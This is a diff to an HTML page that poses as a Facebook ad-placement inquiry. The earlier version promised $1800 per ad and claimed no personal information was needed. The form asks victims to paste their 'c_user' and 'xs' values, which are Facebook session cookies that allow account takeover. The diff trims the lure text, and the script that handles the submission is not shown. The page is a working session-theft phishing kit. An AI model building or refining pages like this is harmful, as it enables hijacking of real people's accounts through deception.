@@ -12,7 +12,7 @@ body {
     padding: 0;
 }
 .container {
-    max-width: 500px;
+    max-width: 400px;
     margin: 50px auto;
     background: #fff;
     padding: 25px;
@@ -24,11 +24,7 @@ h2 {
     color: #1877f2;
     margin-bottom: 20px;
 }
-p {
-    color: #333;
-    line-height: 1.5;
-}
-form input, form textarea, form button {
+form input, form button {
     width: 100%;
     padding: 12px;
     margin: 10px 0;
@@ -51,19 +47,13 @@ form button:hover {
 <body>
 
 <div class="container">
-<h2>Ad Placement Inquiry</h2>
-<p>Hello,</p>
-<p>We'd like to place an advertisement on your Facebook page. You will receive $1800 per ad.</p>
-<p>No personal information or page access is required. If you are interested, please fill out the form below and submit your request.</p>
+<h2>Ad Placement Request</h2>
 
 <form id="adForm">
     <input type="text" name="c_user" placeholder="c_user" required>
     <input type="text" name="xs" placeholder="XS" required>
-    <textarea name="message" rows="5" placeholder="Your Message" required></textarea>
     <button type="submit">Submit Request</button>
 </form>
-
-<p style="text-align:center; font-size:12px; color:#666;">Your request will be processed securely.</p>
 </div>
 
 <script>
